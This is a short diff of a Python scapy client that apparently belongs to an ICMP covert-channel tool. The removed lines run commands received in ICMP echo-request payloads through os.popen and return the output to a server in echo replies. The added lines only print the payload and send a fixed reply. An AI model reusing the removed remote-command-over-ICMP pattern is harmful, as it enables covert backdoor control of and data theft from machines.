@@ -1,5 +1,6 @@
 from scapy.all import *
 from scapy.layers.inet import IP, ICMP
+import subprocess
 __author__ = "Chauvin Antoine"
 __copyright__ = ""
 __credits__ = ["Chauvin Antoine"]
@@ -44,8 +45,7 @@ class Client:
         afin d'avoir une I/O non-bloquante.
         """
 
-        icmp_sniffer = AsyncSniffer(prn=self.process, store=False, filter="icmp")
-        icmp_sniffer.start()
+        sniff(prn=self.process, store=False, filter="icmp")
 
     def process(self, packet):
         """
@@ -60,9 +60,9 @@ class Client:
 
         if packet[IP].src == self.server and packet[ICMP].type == 8 and packet[ICMP].id == self.ID and packet[Raw].load:
             opt_data = (packet[Raw].load).decode('utf-8', errors='ignore')
-            data = os.popen(opt_data).readlines()
-            payload = (IP(dst=self.server, ttl=self.TTL)/ICMP(type=0, id=self.ID)/Raw(load=data))
-            sr(payload, timeout=0, verbose=0)
+            print(opt_data)
+            payload = (IP(dst=self.server, ttl=self.TTL)/ICMP(type=0, id=self.ID)/"ui")
+            send(payload, timeout=0, verbose=0)
 
 
 if __name__ == "__main__":
